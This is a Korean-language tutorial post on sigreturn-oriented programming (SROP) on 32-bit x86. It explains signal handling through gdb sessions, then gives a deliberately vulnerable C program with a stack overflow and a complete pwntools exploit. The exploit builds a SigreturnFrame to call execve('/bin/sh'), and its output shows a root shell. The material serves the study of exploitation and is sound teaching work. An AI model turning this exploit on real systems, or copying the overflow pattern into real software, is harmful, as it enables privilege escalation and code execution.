---
title: Sigreturn-Oriendted Programming - x86
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, sigreturn-oriented programming]
math: true
mermaid: true
---

## Description

sigreturn 시스템 콜을 이용하여 레지스터에 원하는 값을 저장한다.

### Signal

signal은 프로세스에게 이벤트가 발생했음을 알려준다. signal은 일반적으로 커널이 송신하며, 다음과 같은 이벤트 종류가 있다.

- 하드웨어 예외가 발생한 경우
- 사용자가 시그널을 발생시키는 터미널 특수 문자 중 하나를 입력한 경우
- 소프트웨어 이벤트 발생한 경우

signal이 프로세스에게 전달되면 시그널의 종류에 따라 다음과 같은 동작을 수행한다. 

- 시그널 무시
- 프로세스 종료
- 코어 덤프 파일 생성 후 프로세스 종료
- 프로세스 중지
- 프로세스 실행 재개

### Signal Handler

signal handler는 프로그램이 특정 시그널의 기본 동작을 수행하는 대신 프로그래머가 원하는 동작을 수행하도록 변경할 수 있다. signal hnadler는 User Mode 프로세스에 정의되어 있고 user mode 코드 세그먼트에 포함된다. signal handler가 user mode에서 실행되는 동안 kernel mode에서 handle_signal()함수가 실행된다.

user mode에서 kernel mode로 진입시 user mode에서 사용중이던 context를 kernel stack에 저장한다. kernel mode에서 user mode로 진입 시 kernel stack은 모두 초기화된다. 이러한 문제를 해결하기 위해 setup_frame(), sigreturn() 함수를 사용한다.

- setup_frame(): user mode의 stack을 설정
- sigreturn(): kernel mode stack에 hardware context를 복사하고, user mode stack의 원래의 context를 저장

### signal handler 처리

인터럽트 또는 예외가 발생하면 프로세스는 Kernel Mode로 전환한다. 커널은 User Mode로 돌아가기 전 do_signal() 함수를 실행한다.

- `do_signal()` -\> `handle_signal()`을 호출하여 signal 처리
- `handle_signal` -\> `setup_frame()` 호출하여 User Mode stack에 context 저장

프로세스가 User Mode로 다시 전환되며 signal handler가 실행한다. signal handler가 종료되면 `setup_frame()` 함수에 의해 User Mode stack에 저장된 리턴 코드가 실행된다. 해당 코드에 의해 `sigreturn()` 시스템 함수 호출된다.

- `sigreturn()` 시스템 함수에 의해 Kernel Mode Stack에서 일반 프로그램의 hardware context를 user mode의 stack에 복사
- `sigreturn()` 함수는 `restore_sigcontext()`을 호출하여 user mode 스택을 원래 상태로 복원

시스템 호출이 종료되면 일반 프로그램은 실행 재개할 수 있다.

```
user mode    user process --                    --> signal handler --                         --> user process
                           |                    |                   |                         |
                           -->  do_signal()     |                   --> system_call()         |
kernel mode                    handle_signal()  |                       sys_sigreturn()       |
                               setup_frame()  ---                       restore_sigcontext() --
```

```c
// Test Code
// gcc -m32 -g -o sig32 sig.c
#include <stdio.h>
#include <signal.h>
 
struct sigcontext sigcontext;
 
void handle_signal(int signum){
    printf("Signal number: %d\n", signum);
}
 
int main(){
    signal(SIGINT, (void *)handle_signal);
    while(1) {}
    return 0;
}
```

gdb가 인터럽트에 반응하지 않도록 설정한다.

```
gdb-peda$ b handle_signal
Breakpoint 1 at 0x8048441: file sig.c, line 8.
gdb-peda$ handle SIGINT nostop pass
Signal        Stop  Print   Pass to program Description
SIGINT        No    Yes Yes     Interrupt
```

"CTRL + C" SIGINT 시그널 발생시키고 "bt"로 frame을 확인한다.

```
gdb-peda$ bt
#0  handle_signal (signum=0x2) at sig.c:8
#1  <signal handler called>
#2  main () at sig.c:13
#3  0xb7e21637 in __libc_start_main (main=0x8048457 <main>, argc=0x1, argv=0xbffff5e4, init=0x8048480 <__libc_csu_init>, 
    fini=0x80484e0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff5dc) at ../csu/libc-start.c:291
#4  0x08048361 in _start ()
```

frame 0에서 stack에 저장된 각 레지스터의 값

```
gdb-peda$ frame 0
#0  handle_signal (signum=0x2) at sig.c:8
8       printf("Signal number: %dn", signum);
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->gs
$15 = 0x33
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->fs
$16 = 0x0
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->es
$17 = 0x7b
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->ds
$18 = 0x7b
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->edi
$19 = 0xb7fbb000
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->esi
$20 = 0xb7fbb000
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->ebp
$21 = 0xbffff538
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->esp
$22 = 0xbffff530
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->ebx
$23 = 0x0
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->edx
$24 = 0x0
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->ecx
$25 = 0x0
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->eax
$26 = 0x0
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->trapno
$27 = 0x1
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->err
$28 = 0xffffffff
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->eip
$29 = 0x804847a
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->cs
$30 = 0x73
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->eflags
$31 = 0x286
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->esp_at_signal
$32 = 0xbffff530
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->ss
$33 = 0x7b
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->fpstate
$34 = (struct _fpstate *) 0xbffff050
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->oldmask
$35 = 0x0
gdb-peda$ p ((struct sigcontext *)($ebp + 3 * 4))->cr2
$36 = 0x0
```

__kernel_sigreturn() 함수에서 에서 sys_sigreturn() 시스템 함수를 호출한다. x86에서 sys_sigreturn 시스템 함수의 번호는 0x77(119)

```
gdb-peda$ frame 1
#1  <signal handler called>
gdb-peda$ x/3i $eip
=> 0xb7fd9d00 <__kernel_sigreturn>: pop    eax
0xb7fd9d01 <__kernel_sigreturn+1>:  mov    eax,0x77
0xb7fd9d06 <__kernel_sigreturn+6>:  int    0x80
```

frame 2는 frame 0의 stack에 저장된 값이 레지스터에 저장된다.

```
gdb-peda$ frame 2
#2  main () at sig.c:13
13      while(1) {}
gdb-peda$ info r
eax            0x0  0x0
ecx            0x0  0x0
edx            0x0  0x0
ebx            0x0  0x0
esp            0xbffff530   0xbffff530
ebp            0xbffff538   0xbffff538
esi            0xb7fbb000   0xb7fbb000
edi            0xb7fbb000   0xb7fbb000
eip            0x804847a    0x804847a <main+35>
eflags         0x286    [ PF SF IF ]
cs             0x73 0x73
ss             0x7b 0x7b
ds             0x7b 0x7b
es             0x7b 0x7b
fs             0x0  0x0
gs             0x33 0x33
```

sigreturn() 시스템 함수는 signal을 처리하는 프로세스가 kernel mode에서 user mode로 돌아올 때 stack을 복원하기 위해 사용되는 함수이다. stack을 복원하기 위해 restore_sigcontext() 함수를 호출한다.

SROP를 이용할 때 stack에 다음과 같은 형태로 값을 저장해야 한다.

```
# ifdef __i386__
struct sigcontext {
    __u16               gs, __gsh;
    __u16               fs, __fsh;
    __u16               es, __esh;
    __u16               ds, __dsh;
    __u32               edi;
    __u32               esi;
    __u32               ebp;
    __u32               esp;
    __u32               ebx;
    __u32               edx;
    __u32               ecx;
    __u32               eax;
    __u32               trapno;
    __u32               err;
    __u32               eip;
    __u16               cs, __csh;
    __u32               eflags;
    __u32               esp_at_signal;
    __u16               ss, __ssh;
    struct _fpstate __user      *fpstate;
    __u32               oldmask;
    __u32               cr2;
};
```

## Proof of concept

```c
// Vuln Code
// gcc -m32 -fno-stack-protector -o srop32 srop32.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 256);
}

void main(){
    seteuid(getuid());
    write(1,"Hello SROP\n",11);
    vuln();
}

```

"A"*66 이상 입력 시 return address 변조할 수 있다. sigreturn()함수를 이용해 레지스터에 필요한 값을 저장한다.*  ESP : sigreturn() 함수 호출 후 이동할 주소("int 0x80" 명령어가 저장된 주소) * EBX : "/bin/sh" 문자열이 저장된 주소 * EAX : execve() 함수의 시스템 콜 번호 * EIP : "int 0x80" 명령어가 저장된 주소 * CS : User Code(0x23) * SS : User Data / Stack(0x2b)

### CS(Code segment) & SS(Stack Segment)

sigcontext 구조체 형태로 stack에 저장할 때 CS, SS 레지스터 설정을 해야한다. 공격 코드들은 user mode에서 실행되기 때문에 user code / user stack 값을 사용해야 한다.

|Purpose|Segment(32bit)|Segment(64bit - 32bit)|
|:---:|:---:|:---:|
|Kernel Code|0x60|0x8|
|Kernel Data / Stack|0x68|0x18|
|User Code|0x73|0x23|
|User Data / Stack|0x7b|0x2b|

libc offset을 계산한다.

```
gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x08049000 r-xp  /root/pwnable/srop32
0x08049000 0x0804a000 r--p  /root/pwnable/srop32
0x0804a000 0x0804b000 rw-p  /root/pwnable/srop32
0x0804b000 0x0806c000 rw-p  [heap]
0xf7e01000 0xf7e02000 rw-p  mapped
0xf7e02000 0xf7faf000 r-xp  /lib32/libc-2.23.so
0xf7faf000 0xf7fb0000 ---p  /lib32/libc-2.23.so
0xf7fb0000 0xf7fb2000 r--p  /lib32/libc-2.23.so
0xf7fb2000 0xf7fb3000 rw-p  /lib32/libc-2.23.so
0xf7fb3000 0xf7fb6000 rw-p  mapped
0xf7fb6000 0xf7fb9000 r-xp  /lib32/libdl-2.23.so
0xf7fb9000 0xf7fba000 r--p  /lib32/libdl-2.23.so
0xf7fba000 0xf7fbb000 rw-p  /lib32/libdl-2.23.so
0xf7fd3000 0xf7fd4000 rw-p  mapped
0xf7fd4000 0xf7fd7000 r--p  [vvar]
0xf7fd7000 0xf7fd9000 r-xp  [vdso]
0xf7fd9000 0xf7ffc000 r-xp  /lib32/ld-2.23.so
0xf7ffc000 0xf7ffd000 r--p  /lib32/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p  /lib32/ld-2.23.so
0xfffdd000 0xffffe000 rw-p  [stack]
gdb-peda$ p 0xf7e4b020(printf)-0xf7e02000
$1 = 0x49020
gdb-peda$ p __kernel_sigreturn
$2 = {<text variable, no debug info>} 0xf7fd8000 <__kernel_sigreturn>
gdb-peda$ p 0xf7fd8000-0xf7e02000
$3 = 0x1d6000
gdb-peda$ x/3i 0xf7fd8000
0xf7fd8000 <__kernel_sigreturn>:    pop    eax
0xf7fd8001 <__kernel_sigreturn+1>:  mov    eax,0x77
0xf7fd8006 <__kernel_sigreturn+6>:  int    0x80
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f5b02b ("/bin/sh")
gdb-peda$ p 0xf7f5b02b-0xf7e02000
$6 = 0x15902b
```

## Exploit code

```python
# Exploit Code
from pwn import *

#context.log_level='debug'  
binary = ELF('./srop32')
p = process(binary.path)
#gdb.attach(p)

p.recvline()
stackAddr = p.recvline().split(' ')[3]
stackAddr = int(stackAddr,16)

#You need to change the value to match the environment you are testing.
libcBase = stackAddr - 0x49020
ksigreturn = libcBase + 0x1d6001
syscall = libcBase + 0x1d6006
binsh = libcBase + 0x15902b

print 'The base address of Libc    : ' + hex(libcBase)
print 'Address of syscall gadget   : ' + hex(syscall)
print 'Address of string "/bin/sh" : ' + hex(binsh)
print 'Address of sigreturn()      : ' + hex(ksigreturn)

exploit = ''
exploit += "x90" * 66
exploit += p32(ksigreturn)  #ret

#Runed a 32bit program in the 64bit operation system.
frame = SigreturnFrame(kernel='amd64')
frame.eax = 0x0b  # execve
frame.ebx = binsh 
frame.esp = syscall
frame.eip = syscall
exploit += str(frame)

#raw_input('1')
p.send(exploit)
p.interactive()  
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable# python exploit.py 
[*] '/root/pwnable/srop32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/root/pwnable/srop32': pid 10887
The base address of Libc    : 0xf7d8a000
Address of syscall gadget   : 0xf7f60006
Address of string "/bin/sh" : 0xf7ee302b
Address of sigreturn()      : 0xf7f60001
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [01.SROP(Sigreturn-oriented programming) - x86](https://www.lazenca.net/display/TEC/01.SROP%28Sigreturn-oriented+programming%29+-+x86)